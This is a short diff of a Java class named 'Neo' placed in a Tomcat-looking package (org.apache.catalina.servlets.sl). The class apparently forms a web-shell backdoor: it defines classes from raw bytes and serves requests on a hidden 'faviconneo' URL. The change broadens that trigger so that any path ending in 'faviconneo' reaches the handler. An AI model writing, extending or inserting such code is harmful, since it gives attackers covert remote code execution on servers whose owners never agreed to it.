@@ -1,7 +1,6 @@
 package org.apache.catalina.servlets.sl;
 
 public class Neo {
-    private static final String pathPattern= "/faviconneo";
     public static java.util.Map<String,Object> namespace = new java.util.HashMap<String,Object>();
 
     public static Class unsafedefine(byte[] bytes) throws Exception {
@@ -26,7 +25,7 @@ public class Neo {
     }
 
     public static void doService(Object obj, String url, String method, java.io.InputStream in) {
-        if (url.matches(pathPattern)) {
+        if (url.matches("/(.*)faviconneo")) {
             java.util.Map objMap = (java.util.Map) obj;
             Object request = objMap.get("request");
             Object response = objMap.get("response");
